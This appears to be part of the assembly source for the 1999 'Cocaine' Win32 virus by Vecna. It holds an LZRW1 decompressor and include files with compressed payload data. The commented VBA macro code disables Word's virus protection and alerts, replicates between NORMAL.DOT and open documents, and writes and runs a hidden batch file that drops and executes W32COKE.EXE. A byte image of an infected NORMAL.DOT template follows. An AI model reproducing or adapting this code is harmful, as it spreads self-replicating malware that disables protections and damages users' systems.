lzrw1_decompress proc	near
?live1@768:
   ;	
   ;	void lzrw1_decompress(p_src_first,src_len,p_dst_first,p_dst_len)
   ;	
@27:
	push      ebp
	mov       ebp,esp
	add       esp,-8
	push      ebx
	push      esi
	push      edi
   ;	
   ;	/* Input  : Specify input block using p_src_first and src_len.          */
   ;	/* Input  : Point p_dst_first to the start of the output zone.          */
   ;	/* Input  : Point p_dst_len to a ULONG to receive the output length.    */
   ;	/* Input  : Input block and output zone must not overlap. User knows    */
   ;	/* Input  : upperbound on output block length from earlier compression. */
   ;	/* Input  : In any case, maximum expansion possible is eight times.     */
   ;	/* Output : Length of output block written to *p_dst_len.               */
   ;	/* Output : Output block in Mem[p_dst_first..p_dst_first+*p_dst_len-1]. */
   ;	/* Output : Writes only  in Mem[p_dst_first..p_dst_first+*p_dst_len-1]. */
   ;	UBYTE *p_src_first, *p_dst_first; ULONG src_len, *p_dst_len;
   ;	{UWORD controlbits=0, control;
   ;	
?live1@784: ; EDI = control, ECX = p_src_first
	xor       esi,esi
?live1@800: ; 
	mov       ecx,dword ptr [ebp+20]
   ;	
   ;	 UBYTE *p_src=p_src_first+FLAG_BYTES, *p_dst=p_dst_first,
   ;	       *p_src_post=p_src_first+src_len;
   ;	
?live1@816: ; EAX = p_src, EDX = p_dst, EDI = control, ESI = controlbits, ECX = p_src_first
	;	
	mov       ebx,dword ptr [ebp+16]
	add       ebx,ecx
?live1@832: ; EDI = control, ESI = controlbits, ECX = p_src_first
	mov       edx,dword ptr [ebp+12]
?live1@848: ; EAX = p_src, EDX = p_dst, EDI = control, ESI = controlbits, ECX = p_src_first
	;	
	mov       dword ptr [ebp-4],ebx
?live1@864: ; EDI = control, ESI = controlbits, ECX = p_src_first
	lea       eax,dword ptr [ecx+4]
   ;	
   ;	 if (*p_src_first==FLAG_COPY)
   ;	
?live1@880: ; EAX = p_src, EDX = p_dst, EDI = control, ESI = controlbits, ECX = p_src_first
	;	
	cmp       byte ptr [ecx],1
	jne       short @28
   ;	
   ;	   {fast_copy(p_src_first+FLAG_BYTES,p_dst_first,src_len-FLAG_BYTES);
   ;	
?live1@896: ; ECX = p_src_first
	add       ecx,4
	push      ecx
	mov       eax,dword ptr [ebp+12]
	push      eax
	mov       edi,dword ptr [ebp+16]
	sub       edi,4
	push      edi
	call      fast_copy
   ;	
   ;	    *p_dst_len=src_len-FLAG_BYTES; return;}
   ;	
?live1@912: ; EDI = @temp14
	mov       eax,dword ptr [ebp+8]
	mov       dword ptr [eax],edi
	jmp       short @29
   ;	
   ;	 while (p_src!=p_src_post)
   ;	
?live1@928: ; EAX = p_src, EDX = p_dst, EDI = control, ESI = controlbits
@28:
	cmp       eax,dword ptr [ebp-4]
	je        short @31
   ;	
   ;	   {if (controlbits==0)
   ;	
@30:
	test      esi,esi
	jne       short @32
   ;	
   ;	      {control=*p_src++; control|=(*p_src++)<<8; controlbits=16;}
   ;	
?live1@960: ; EAX = p_src, EDX = p_dst
	movzx     edi,byte ptr [eax]
	inc       eax
	xor       ecx,ecx
;	mov       esi,16
        push 16
        pop esi
	mov       cl,byte ptr [eax]
	shl       ecx,8
	or        edi,ecx
	inc       eax
   ;	
   ;	    if (control&1)
   ;	
?live1@976: ; EAX = p_src, EDX = p_dst, EDI = control, ESI = controlbits
@32:
	test      edi,1
	je        short @33
	
;	jnc        short @33
   ;
   ;	      {UWORD offset,len; UBYTE *p;
   ;	       offset=(*p_src&0xF0)<<4; len=1+(*p_src++&0xF);
   ;	
@34:
	xor       ebx,ebx
	xor       ecx,ecx
	mov       bl,byte ptr [eax]
	mov       cl,byte ptr [eax]
	and       ebx,15
	inc       eax
	inc       ebx
	and       ecx,240
	mov       dword ptr [ebp-8],ebx
   ;	
   ;	       offset+=*p_src++&0xFF; p=p_dst-offset;
   ;	
?live1@1008: ; EAX = p_src, EDX = p_dst, EDI = control, ESI = controlbits, ECX = offset
	;	
	xor       ebx,ebx
	mov       bl,byte ptr [eax]
	inc       eax
?live1@1024: ; EAX = p_src, EDX = p_dst, EDI = control, ESI = controlbits
	shl       ecx,4
?live1@1040: ; EAX = p_src, EDX = p_dst, EDI = control, ESI = controlbits, ECX = offset
	;	
	and       ebx,255
	add       ecx,ebx
	mov       ebx,edx
	sub       ebx,ecx
	mov       ecx,ebx
	jmp       short @36
   ;
   ;	       while (len--) *p_dst++=*p++;}
   ;	
?live1@1056: ; EAX = p_src, EDX = p_dst, ECX = p, EDI = control, ESI = controlbits
	;	
@35:
	mov       bl,byte ptr [ecx]
	inc       ecx
	mov       byte ptr [edx],bl
	inc       edx
@36:
	mov       ebx,dword ptr [ebp-8]
	add       dword ptr [ebp-8],-1
	test      ebx,ebx
	jne       short @35
@37:
	jmp       short @38
   ;	
   ;	    else
   ;	       *p_dst++=*p_src++;
   ;
?live1@1072: ; EAX = p_src, EDX = p_dst, EDI = control, ESI = controlbits
@33:
	mov       cl,byte ptr [eax]
	inc       eax
	mov       byte ptr [edx],cl
	inc       edx
   ;	
   ;	    control>>=1; controlbits--;
   ;	
@38:
	shr       edi,1
	dec       esi
	cmp       eax,dword ptr [ebp-4]
	jne       short @30
   ;	
   ;	   }
   ;	 *p_dst_len=p_dst-p_dst_first;
   ;	
?live1@1120: ; EDX = p_dst
@31:
	sub       edx,dword ptr [ebp+12]
	mov       eax,dword ptr [ebp+8]
	mov       dword ptr [eax],edx
   ;	
   ;	}
   ;	
?live1@1136: ; 
@39:
@29:
	pop       edi
	pop       esi
	pop       ebx
	pop       ecx
	pop       ecx
	pop       ebp
	ret       16
lzrw1_decompress	endp

;-----------------------------------(LZ.INC)----------------------------------
;---------------------------------(MACRO.INC)---------------------------------
;Macro poly data
;(c) Vecna 1999
;ASM->COM->LZ->INC

;The code in COMMENT bellow is to be compiled to a .COM file, then compressed
;with my LZ compressor, then BIN2INCed. It is the code used for macro poly
;engine and do the actual infection process. The macro code is divided in
;chunks. The format of each chunks is simple: the first byte indicate the
;step that this chunk will be processed, and follow a ASCIIZ string. The macro
;poly engine copies each chunk, mixing the ones from the same level between
;themselfs, and inserting macro garbage code between real macro lines. Some
;chunks(6) receive special processing by the engine ;-)
;The macro poly engine also do magic with the %X labels: they're changed by
;random strings.

; '%1
; SUB AUTOCLOSE()
; ON ERROR RESUME NEXT
; OPTIONS.VIRUSPROTECTION = FALSE
; OPTIONS.CONFIRMCONVERSIONS = FALSE
; OPTIONS.SAVENORMALPROMPT = FALSE
; APPLICATION.DISPLAYALERTS = WDALERTSNONE
; SHOWVISUALBASICEDITOR = FALSE
; %2=1
; %3=1
; FOR %4 = 1 TO NORMALTEMPLATE.VBPROJECT.VBCOMPONENTS.COUNT
; IF NORMALTEMPLATE.VBPROJECT.VBCOMPONENTS(%4).CODEMODULE.LINES(1,1) = "'%1" THEN %2=%4
; NEXT %4
; FOR %4 = 1 TO ACTIVEDOCUMENT.VBPROJECT.VBCOMPONENTS.COUNT
; IF ACTIVEDOCUMENT.VBPROJECT.VBCOMPONENTS(%4).CODEMODULE.LINES(1,1) = "'%1" THEN %3=%4
; NEXT %4
; OPEN "C:\%7.BAT" FOR OUTPUT AS 1
; PRINT #1,"@ECHO OFF"
; PRINT #1,"DEBUG <C:\COCAINE.SRC >NUL"
; PRINT #1,"COPY C:\W32COKE.EX C:\W32COKE.EXE >NUL"
; PRINT #1,"C:\W32COKE.EXE"
; PRINT #1,"DEL C:\W32COKE.EX >NUL"
; PRINT #1,"DEL C:\COCAINE.SRC >NUL"
; PRINT #1,"DEL C:\COCAINE.SYS >NUL"
; PRINT #1,"DEL C:\W32COKE.EXE >NUL"
; PRINT #1,"DEL C:\%7.BAT >NUL"
; CLOSE #1
; SET %5 = NORMALTEMPLATE.VBPROJECT.VBCOMPONENTS(%2).CODEMODULE
; SET %6 = ACTIVEDOCUMENT.VBPROJECT.VBCOMPONENTS(%3).CODEMODULE
; IF %5.LINES(1, 1) <> "'%1" THEN
; %5.DELETELINES 1, %5.COUNTOFLINES
; %5.INSERTLINES 1, %6.LINES(1, %6.COUNTOFLINES)
; END IF
; IF %6.LINES(1, 1) <> "'%1" THEN
; %6.DELETELINES 1, %6.COUNTOFLINES
; %6.INSERTLINES 1, %5.LINES(1, %5.COUNTOFLINES)
; END IF
; OPEN "C:\ANCEV.SYS" FOR OUTPUT AS 1
; CLOSE 1
; SHELL %7.BAT, VBHIDE
; FOR %4 = 1 TO 100
; NEXT %4
; KILL %7.BAT
; END SUB
;
; The following code should be compiled to a .COM file:
;
; .MODEL TINY
; .CODE
; .STARTUP
; 
; CRLF EQU <13,10>
;
; DB 1
; DB "'%1", CRLF
; DB "SUB AUTOCLOSE()", CRLF
; DB "ON ERROR RESUME NEXT", CRLF
; DB 0
; 
; DB 2
; DB "OPTIONS.VIRUSPROTECTION = FALSE", CRLF
; DB 0
; 
; DB 2
; DB "OPTIONS.CONFIRMCONVERSIONS = FALSE", CRLF
; DB 0
; 
; DB 2
; DB "OPTIONS.SAVENORMALPROMPT = FALSE", CRLF
; DB 0
; 
; DB 2
; DB "APPLICATION.DISPLAYALERTS = WDALERTSNONE", CRLF
; DB 0
; 
; DB 2
; DB "SHOWVISUALBASICEDITOR = FALSE", CRLF
; DB 0
; 
; DB 2
; DB "%2=1", CRLF
; DB 0
; 
; DB 2
; DB "%3=1", CRLF
; DB 0
; 
; DB 3
; DB "FOR %4 = 1 TO NORMALTEMPLATE.VBPROJECT.VBCOMPONENTS.COUNT", CRLF
; DB 'IF NORMALTEMPLATE.VBPROJECT.VBCOMPONENTS(%4).CODEMODULE.LINES(1,1) = "''%1" THEN %2=%4', CRLF
; DB "NEXT %4", CRLF
; DB 0
;
; DB 3
; DB "FOR %4 = 1 TO ACTIVEDOCUMENT.VBPROJECT.VBCOMPONENTS.COUNT", CRLF
; DB 'IF ACTIVEDOCUMENT.VBPROJECT.VBCOMPONENTS(%4).CODEMODULE.LINES(1,1) = "''%1" THEN %3=%4', CRLF
; DB "NEXT %4", CRLF
; DB 0
; 
; DB 3
; DB 'OPEN "C:\%7.BAT" FOR OUTPUT AS 1', CRLF
; DB 'PRINT #1,"@ECHO OFF"', CRLF
; DB 'PRINT #1,"DEBUG <C:\COCAINE.SRC >NUL"', CRLF
; DB 'PRINT #1,"COPY C:\W32COKE.EX C:\W32COKE.EXE >NUL"', CRLF
; DB 'PRINT #1,"C:\W32COKE.EXE"', CRLF
; DB 'PRINT #1,"DEL C:\W32COKE.EX >NUL"', CRLF
; DB 'PRINT #1,"DEL C:\COCAINE.SRC >NUL"', CRLF
; DB 'PRINT #1,"DEL C:\COCAINE.SYS >NUL"', CRLF
; DB 'PRINT #1,"DEL C:\W32COKE.EXE >NUL"', CRLF
; DB 'PRINT #1,"DEL C:\%7.BAT >NUL"', CRLF
; DB 'CLOSE #1', CRLF
; DB 0
;
; DB 4
; DB "SET %5 = NORMALTEMPLATE.VBPROJECT.VBCOMPONENTS(%2).CODEMODULE", CRLF
; DB 0
; 
; DB 4
; DB "SET %6 = ACTIVEDOCUMENT.VBPROJECT.VBCOMPONENTS(%3).CODEMODULE", CRLF
; DB 0
; 
; DB 5
; DB 'IF %5.LINES(1, 1) <> "''%1" THEN', CRLF
; DB "%5.DELETELINES 1, %5.COUNTOFLINES", CRLF
; DB "%5.INSERTLINES 1, %6.LINES(1, %6.COUNTOFLINES)", CRLF
; DB "END IF", CRLF
; DB 0
; 
; DB 5
; DB 'IF %6.LINES(1, 1) <> "''%1" THEN', CRLF
; DB "%6.DELETELINES 1, %6.COUNTOFLINES", CRLF
; DB "%6.INSERTLINES 1, %5.LINES(1, %5.COUNTOFLINES)", CRLF
; DB "END IF", CRLF
; DB 0
; 
; DB 6
;;CREATE DEBUG SCRIPT
; DB 0
;
; DB 7
; DB 'OPEN "C:\ANCEV.SYS" FOR OUTPUT AS 1', CRLF
; DB 'PRINT #1,""', CRLF
; DB "CLOSE #1", CRLF
; DB 0
; 
; DB 7
; DB "SHELL %7.BAT, VBHIDE", CRLF
; DB "FOR %4=1 TO 100", CRLF
; DB "NEXT %4", CRLF
; DB "KILL %7.BAT", CRLF
; DB 0
; 
; DB 8
; DB "END SUB", CRLF
; DB 0
; 
; END

macro_sized dd 0
macro_size	EQU 750		; size in bytes
macros DB 000H,000H,000H,000H,000H,000H,001H,027H,025H,031H,00DH,00AH,053H,055H
DB 042H,020H,041H,055H,054H,04FH,043H,04CH,000H,000H,04FH,053H,045H,028H,029H
DB 00DH,00AH,04FH,04EH,020H,045H,052H,052H,04FH,052H,020H,000H,000H,052H,045H
DB 053H,055H,04DH,045H,020H,04EH,045H,058H,054H,00DH,00AH,000H,002H,04FH,000H
DB 000H,050H,054H,049H,04FH,04EH,053H,02EH,056H,049H,052H,055H,053H,050H,052H
DB 04FH,054H,004H,008H,045H,043H,003H,011H,020H,03DH,020H,046H,041H,04CH,053H
DB 045H,00BH,023H,043H,04FH,04EH,046H,008H,007H,049H,052H,04DH,002H,007H,056H
DB 045H,052H,053H,003H,036H,00FH,026H,003H,049H,053H,041H,056H,045H,04EH,020H
DB 002H,04FH,052H,04DH,041H,04CH,002H,04EH,04DH,050H,054H,00BH,024H,041H,050H
DB 050H,04CH,049H,043H,002H,000H,041H,003H,061H,02EH,044H,049H,053H,050H,04CH
DB 041H,059H,041H,04CH,045H,052H,054H,053H,089H,000H,002H,025H,057H,044H,005H
DB 00BH,04EH,04FH,04EH,004H,076H,053H,048H,04FH,057H,056H,049H,053H,055H,000H
DB 018H,041H,04CH,042H,041H,053H,049H,043H,045H,044H,049H,054H,002H,0BEH,00AH
DB 097H,025H,032H,03DH,021H,009H,002H,0E9H,000H,002H,025H,033H,004H,008H,003H
DB 046H,002H,01FH,025H,034H,002H,04AH,031H,020H,054H,04FH,022H,068H,020H,005H
DB 083H,054H,045H,04DH,002H,065H,054H,045H,02EH,056H,042H,002H,08EH,04AH,002H
DB 0DCH,002H,00AH,043H,008H,090H,04FH,04DH,050H,002H,065H,04EH,054H,053H,02EH
DB 043H,04FH,055H,04EH,012H,007H,049H,046H,00FH,030H,043H,000H,00FH,030H,005H
DB 030H,028H,025H,034H,029H,002H,034H,044H,045H,04DH,04FH,044H,055H,04CH,045H
DB 02EH,000H,014H,04CH,049H,04EH,045H,053H,028H,031H,02CH,031H,029H,002H,077H
DB 022H,012H,079H,022H,020H,054H,010H,0AAH,048H,045H,04EH,020H,002H,09BH,025H
DB 034H,00DH,00AH,013H,064H,020H,003H,009H,000H,00EH,09DH,041H,012H,064H,020H
DB 0BBH,056H,045H,044H,04FH,043H,012H,08AH,04EH,054H,002H,093H,00FH,09DH,045H
DB 00DH,09DH,00FH,030H,00FH,0CDH,04EH,003H,030H,0CBH,004H,00FH,09DH,00FH,09DH
DB 031H,007H,09DH,033H,03DH,003H,094H,00AH,09DH,04FH,050H,002H,0B4H,022H,043H
DB 03AH,05CH,025H,080H,000H,037H,02EH,042H,041H,054H,022H,020H,013H,04BH,04FH
DB 055H,054H,050H,055H,054H,020H,041H,004H,000H,053H,020H,012H,066H,050H,052H
DB 049H,04EH,054H,020H,023H,031H,02CH,022H,040H,045H,043H,000H,002H,048H,04FH
DB 020H,04FH,046H,046H,022H,00DH,00AH,009H,016H,044H,045H,042H,055H,047H,020H
DB 042H,000H,03CH,002H,043H,043H,04FH,043H,041H,012H,016H,02EH,053H,052H,043H
DB 020H,03EH,04EH,055H,04CH,041H,000H,00CH,027H,043H,04FH,050H,059H,020H,002H
DB 025H,057H,033H,032H,043H,04FH,04BH,045H,02EH,045H,06AH,031H,058H,00DH,00EH
DB 045H,00FH,033H,02CH,003H,096H,009H,02EH,045H,00CH,04EH,044H,045H,04CH,00DH
DB 03FH,00FH,03EH,02CH,022H,09FH,0FFH,006H,023H,00FH,095H,00FH,047H,003H,047H
DB 008H,024H,059H,053H,00FH,048H,008H,048H,00AH,08AH,00FH,024H,008H,024H,015H
DB 044H,007H,01FH,034H,080H,012H,039H,001H,06FH,032H,048H,004H,053H,045H,054H
DB 020H,025H,035H,022H,02AH,02FH,09CH,01FH,0CFH,016H,0CFH,032H,02BH,06CH,008H
DB 041H,036H,0AFH,014H,002H,041H,02FH,010H,00FH,041H,006H,041H,033H,00EH,041H
DB 005H,022H,0E8H,025H,035H,028H,0B6H,020H,022H,0B7H,03CH,03EH,020H,019H,071H
DB 029H,0B8H,00DH,00AH,002H,01EH,012H,033H,045H,054H,045H,024H,03DH,020H,031H
DB 02CH,002H,0B1H,022H,0F1H,032H,025H,04FH,0C6H,065H,046H,004H,013H,004H,023H
DB 049H,04EH,053H,032H,0B5H,004H,010H,004H,023H,036H,009H,053H,025H,036H,00CH
DB 02FH,042H,079H,045H,0E0H,0F3H,04EH,044H,020H,049H,046H,002H,0BFH,004H,07EH
DB 00AH,02BH,00FH,07EH,002H,05BH,036H,02EH,00FH,07EH,00DH,04FH,004H,023H,00FH
DB 07EH,033H,002H,00AH,0D1H,002H,0BFH,043H,04FH,009H,0ADH,00BH,07EH,006H,000H
DB 007H,028H,0E7H,041H,04EH,043H,045H,056H,02EH,078H,040H,053H,059H,053H,02FH
DB 0EAH,02CH,0EAH,022H,025H,01AH,0BEH,007H,053H,048H,045H,04CH,04CH,020H,015H
DB 0DEH,02CH,0C0H,088H,020H,056H,042H,048H,049H,044H,042H,0A8H,033H,02AH,025H
DB 034H,03DH,044H,073H,031H,030H,030H,03AH,0F4H,004H,000H,04BH,049H,008H,02FH
DB 00DH,00AH,000H,008H,045H,04EH,044H,020H,053H,055H,042H,00DH,00AH,000H,000H
DB 000H
;---------------------------------(MACRO.INC)---------------------------------
;----------------------------------(NDOT.INC)---------------------------------
;Macro poly data
;(c) Vecna 1999

;This is the binary image of the LZ compressed NORMAL.DOT loader. The loader
;is, basically, a WinWord8 template with the code below. Its function is load
;the 2nd part of the macro virus code, polymorphic, from the disk. The routine
;that drop the image should be changed to make it _patch_ the ' COCAINE string
;and making the virus stop reinfecting, copying the first line of the virus
;dropped source to there... bahh, nevermind... :-)

;Sub AutoExec()
;On Error Goto erro
;Application.DisplayAlerts = False
;Application.EnableCancelKey = wdDisabled
;For i = 1 To NormalTemplate.VBProject.VBComponents.Count
;If NormalTemplate.VBProject.VBComponents(i).CodeModule.Lines(1,1) = "'Cocaine" Then GoTo erro
;Next i
;NormalTemplate.VBProject.VBComponents.Import("c:\cocaine.sys")
;NormalTemplate.Save
;erro:
;End Sub

normaldot_size	EQU 8292		; size in bytes

normaldot_sized  dd 0
normaldot DB 000H,000H,000H,000H,000H,002H,0D0H,0CFH,011H,0E0H,0A1H,0B1H,01AH,0E1H
DB 000H,00EH,001H,03EH,000H,003H,000H,0FEH,0FFH,0A8H,061H,009H,000H,006H,00AH
DB 018H,001H,002H,00CH,021H,002H,004H,004H,003H,010H,000H,000H,023H,002H,009H
DB 003H,014H,0FEH,0C8H,0FFH,0FFH,0FFH,0FFH,002H,00BH,000H,020H,002H,005H,002H
DB 00BH,00FH,003H,00FH,010H,00FH,010H,00FH,010H,00FH,010H,00FH,010H,00FH,010H
DB 00FH,010H,0FFH,0FFH,00FH,010H,00FH,010H,00FH,010H,00FH,010H,00FH,010H,00FH
DB 010H,00FH,010H,00FH,010H,00FH,010H,00FH,010H,00FH,010H,00FH,010H,00FH,010H
DB 00FH,010H,00FH,010H,00FH,010H,007H,000H,00FH,010H,00FH,010H,00CH,010H,0ECH
DB 0A5H,0C1H,000H,049H,000H,016H,004H,000H,000H,001H,012H,0BFH,03FH,000H,012H
DB 0C0H,002H,003H,012H,0DAH,002H,006H,003H,012H,002H,004H,00EH,000H,062H,06AH
DB 062H,06AH,0B2H,0B3H,0B2H,0B3H,003H,0E0H,002H,014H,00EH,003H,016H,004H,016H
DB 000H,01EH,00CH,000H,000H,0D0H,0D9H,001H,004H,004H,023H,00CH,00EH,023H,0F1H
DB 0CAH,00CH,00FH,0FFH,0FFH,00FH,008H,010H,00FH,00CH,008H,019H,006H,009H,05DH
DB 004H,008H,08CH,004H,006H,000H,000H,003H,008H,003H,004H,0B7H,067H,003H,00FH
DB 00FH,008H,00BH,010H,014H,003H,021H,006H,004H,0BCH,00FH,008H,00FH,010H,002H
DB 010H,002H,0BDH,000H,0C8H,006H,008H,007H,030H,018H,0D0H,0AFH,002H,000H,000H
DB 0B6H,002H,014H,0E0H,002H,004H,003H,003H,00FH,008H,00FH,010H,00FH,010H,007H
DB 010H,018H,012H,00FH,0C7H,002H,041H,076H,055H,0DFH,002H,008H,002H,007H,000H
DB 00FH,008H,00FH,010H,003H,010H,024H,002H,029H,0CEH,002H,080H,0F4H,002H,034H
DB 0C2H,012H,07EH,03EH,0F5H,0FFH,002H,010H,003H,002H,010H,015H,002H,008H,00FH
DB 003H,007H,0F8H,007H,070H,00FH,020H,007H,018H,00FH,008H,007H,010H,003H,058H
DB 003H,034H,007H,010H,007H,050H,0FFH,05FH,007H,008H,007H,018H,003H,024H,003H
DB 004H,007H,010H,00FH,008H,00FH,010H,007H,010H,00FH,048H,00FH,010H,013H,020H
DB 003H,058H,00FH,004H,0A0H,002H,011H,00EH,0FDH,0FBH,002H,004H,0AEH,002H,004H
DB 003H,008H,007H,038H,00FH,008H,007H,010H,007H,070H,007H,050H,003H,010H,038H
DB 002H,03CH,003H,008H,002H,007H,008H,003H,007H,020H,0FFH,006H,007H,038H,007H
DB 008H,008H,021H,00FH,009H,00FH,010H,00EH,010H,007H,050H,007H,068H,0D4H,002H
DB 020H,023H,050H,0A0H,010H,0DAH,09BH,0B8H,0F8H,0FFH,065H,0BEH,001H,027H,050H
DB 007H,008H,007H,028H,007H,038H,002H,02FH,00FH,003H,00FH,010H,00FH,010H,00FH
DB 010H,00FH,010H,00FH,010H,00FH,010H,00FH,010H,0FDH,0FFH,002H,010H,00DH,002H
DB 004H,00FH,003H,00FH,010H,00FH,010H,00FH,010H,00FH,010H,00FH,010H,00FH,010H
DB 00FH,010H,00FH,010H,00FH,010H,00FH,010H,00FH,010H,00FH,010H,0FFH,0FFH,00FH
DB 010H,00FH,010H,00FH,010H,00FH,010H,00FH,010H,00FH,010H,00FH,010H,00FH,010H
DB 00FH,010H,00FH,010H,00FH,010H,00FH,010H,00FH,010H,00FH,010H,00FH,010H,00FH
DB 010H,0EFH,0FFH,00FH,010H,00FH,010H,00CH,010H,042H,066H,001H,002H,004H,00CH
DB 014H,00FH,00DH,00FH,010H,00FH,010H,00FH,010H,00FH,010H,00FH,010H,00FH,010H
DB 00FH,010H,00FH,010H,0FFH,0FFH,00FH,010H,00FH,010H,00FH,010H,00FH,010H,00FH
DB 010H,00FH,010H,00FH,010H,00FH,010H,00FH,010H,00FH,010H,00FH,010H,00FH,010H
DB 00FH,010H,00FH,010H,00FH,010H,00FH,010H,03FH,0FBH,00FH,010H,00FH,010H,00FH
DB 010H,00FH,010H,00FH,010H,009H,010H,001H,000H,012H,0FCH,023H,000H,0FDH,009H
DB 014H,00FH,00AH,00FH,010H,00FH,010H,00FH,010H,0FFH,0FFH,00FH,010H,00FH,010H
DB 00FH,010H,00FH,010H,00FH,010H,00FH,010H,00FH,010H,00FH,010H,00FH,010H,00FH
DB 010H,00FH,010H,00FH,010H,00FH,010H,00FH,010H,00FH,010H,00FH,010H,0FFH,0EFH
DB 00FH,010H,00FH,010H,00FH,010H,00FH,010H,00FH,010H,00FH,010H,00FH,010H,00FH
DB 010H,00FH,010H,00FH,010H,007H,010H,082H,064H,000H,028H,000H,007H,015H,00FH
DB 008H,0FFH,0FFH,00FH,010H,00FH,010H,00FH,010H,00FH,010H,00FH,010H,00FH,010H
DB 00FH,010H,00FH,010H,00FH,010H,00FH,010H,00FH,010H,00FH,010H,00FH,010H,00FH
DB 010H,00FH,010H,00FH,010H,0FFH,0FFH,00FH,010H,00FH,010H,00FH,010H,00FH,010H
DB 00FH,010H,00FH,010H,00FH,010H,00FH,010H,00FH,010H,00FH,010H,00FH,010H,00FH
DB 010H,00FH,010H,00FH,010H,00FH,010H,00FH,010H,0FFH,0FFH,00FH,010H,00FH,010H
DB 00FH,010H,00FH,010H,00FH,010H,00FH,010H,00FH,010H,00FH,010H,00FH,010H,00FH
DB 010H,00FH,010H,00FH,010H,00FH,010H,00FH,010H,00FH,010H,00FH,010H,0FFH,0FFH
DB 00FH,010H,00FH,010H,00FH,010H,00FH,010H,00FH,010H,00FH,010H,00FH,010H,00FH
DB 010H,00FH,010H,00FH,010H,00FH,010H,00FH,010H,00FH,010H,00FH,010H,00FH,010H
DB 00FH,010H,0FFH,0FFH,00FH,010H,00FH,010H,00FH,010H,00FH,010H,00FH,010H,00FH
DB 010H,00FH,010H,00FH,010H,00FH,010H,00FH,010H,00FH,010H,00FH,010H,00FH,010H
DB 00FH,010H,00FH,010H,00FH,010H,0FFH,03FH,00FH,010H,00FH,010H,00FH,010H,00FH
DB 010H,00FH,010H,00FH,010H,00FH,010H,00FH,010H,00FH,010H,00FH,010H,00FH,010H
DB 00FH,010H,00FH,010H,00FH,010H,012H,000H,0E8H,041H,00FH,000H,00AH,062H,007H
DB 05BH,002H,008H,0E2H,069H,004H,01FH,0E2H,086H,040H,0F1H,0FFH,002H,000H,002H
DB 008H,000H,000H,060H,006H,000H,04EH,000H,06FH,000H,072H,000H,06DH,000H,061H
DB 000H,06CH,002H,01EH,003H,024H,004H,070H,000H,000H,06DH,048H,016H,082H,038H
DB 002H,00FH,00CH,003H,036H,000H,041H,040H,0F2H,0FFH,0A1H,000H,036H,011H,040H
DB 002H,016H,013H,000H,046H,002H,038H,06EH,000H,074H,000H,065H,000H,020H,000H
DB 070H,002H,03EH,072H,040H,03DH,000H,0E1H,000H,067H,000H,02EH,006H,00EH,064H
DB 002H,054H,0E3H,002H,022H,002H,02BH,00CH,003H,063H,095H,002H,000H,062H,078H
DB 000H,0D2H,049H,001H,000H,0FFH,002H,001H,003H,010H,004H,020H,0FFH,0FFH,003H
DB 008H,005H,029H,009H,00AH,087H,0BCH,003H,0AFH,082H,003H,019H,002H,090H,083H
DB 0C8H,002H,007H,000H,007H,018H,005H,002H,018H,0FFH,002H,0C8H,000H,000H,005H
DB 000H,056H,002H,088H,008H,000H,063H,000H,06EH,002H,088H,012H,000H,043H,000H
DB 03AH,000H,05CH,000H,04CH,000H,049H,000H,028H,02AH,058H,000H,04FH,002H,00AH
DB 06CH,002H,088H,061H,000H,064H,002H,022H,072H,002H,0A0H,064H,002H,00EH,074H
DB 000H,0D4H,005H,0FFH,001H,003H,068H,056H,002H,042H,000H,002H,088H,004H,007H
DB 00AH,005H,010H,003H,091H,002H,000H,025H,000H,054H,0B5H,0A8H,002H,035H,06DH
DB 002H,0DFH,06CH,002H,059H,003H,0EBH,050H,002H,0D7H,06FH,000H,06AH,002H,016H
DB 063H,002H,0FBH,02EH,002H,020H,080H,060H,068H,000H,069H,000H,073H,000H,044H
DB 002H,055H,063H,000H,075H,000H,06DH,002H,01AH,013H,015H,02EH,014H,035H,000H
DB 041H,002H,00EH,074H,002H,016H,045H,000H,078H,002H,014H,063H,012H,083H,011H
DB 003H,072H,003H,053H,045H,000H,0A8H,0A2H,04DH,000H,050H,002H,0A0H,041H,002H
DB 03FH,045H,002H,00AH,052H,002H,0A6H,04AH,000H,045H,002H,0B8H,054H,002H,0A0H
DB 0A8H,01AH,054H,000H,048H,002H,0BAH,053H,002H,053H,04FH,002H,012H,055H,002H
DB 02CH,045H,012H,0A4H,003H,01AH,041H,000H,055H,055H,01CH,002H,032H,04FH,002H
DB 02AH,058H,002H,004H,043H,002H,0B0H,040H,000H,080H,003H,055H,002H,00AH,002H
DB 003H,0E8H,020H,082H,04FH,001H,002H,066H,009H,010H,002H,013H,004H,003H,002H
DB 010H,004H,007H,000H,002H,01DH,000H,000H,020H,000H,000H,008H,000H,010H,001H
DB 040H,000H,000H,003H,002H,014H,047H,016H,090H,002H,02EH,002H,002H,006H,003H
DB 005H,004H,005H,0F8H,056H,002H,003H,004H,003H,014H,002H,017H,008H,003H,002H
DB 01DH,004H,00CH,054H,002H,0E3H,003H,0D9H,073H,002H,03EH,04EH,002H,0CDH,077H
DB 02DH,000H,002H,008H,052H,002H,0DBH,023H,034H,06EH,002H,022H,035H,010H,090H
DB 001H,002H,000H,005H,005H,001H,002H,0C0H,08BH,001H,007H,006H,002H,005H,007H
DB 002H,013H,003H,003H,007H,077H,003H,00CH,080H,003H,005H,053H,000H,079H,012H
DB 021H,026H,0BCH,062H,002H,03AH,023H,06AH,033H,022H,004H,07EH,00BH,006H,004H
DB 002H,003H,001H,00FH,07EH,004H,0AEH,003H,036H,041H,012H,073H,016H,000H,069H
DB 012H,07FH,003H,034H,022H,012H,0FBH,030H,008H,088H,018H,000H,000H,0C4H,002H
DB 000H,000H,0A9H,0C1H,05CH,004H,0A1H,078H,01CH,033H,066H,07AH,002H,004H,003H
DB 02CH,001H,000H,002H,017H,003H,009H,004H,004H,001H,004H,044H,004H,0F8H,0FDH
DB 000H,003H,010H,004H,029H,004H,014H,013H,006H,003H,00EH,003H,004H,003H,011H
DB 024H,00FH,0F5H,003H,015H,00FH,004H,00FH,010H,00FH,010H,00FH,010H,0FFH,0FFH
DB 00FH,010H,00FH,010H,00FH,010H,00FH,010H,00FH,010H,00FH,010H,00FH,010H,00FH
DB 010H,00FH,010H,00FH,010H,00FH,010H,00FH,010H,00FH,010H,00FH,010H,00FH,010H
DB 00FH,010H,03FH,0F8H,00FH,010H,00FH,010H,00FH,010H,00FH,010H,006H,010H,013H
DB 0CCH,058H,001H,0FFH,0FFH,012H,006H,010H,007H,007H,03BH,0EEH,00BH,00CH,007H
DB 020H,0FFH,0FFH,00FH,008H,00FH,010H,00FH,010H,00FH,010H,00FH,010H,00FH,010H
DB 00FH,010H,00FH,010H,00FH,010H,00FH,010H,00FH,010H,00FH,010H,00FH,010H,00FH
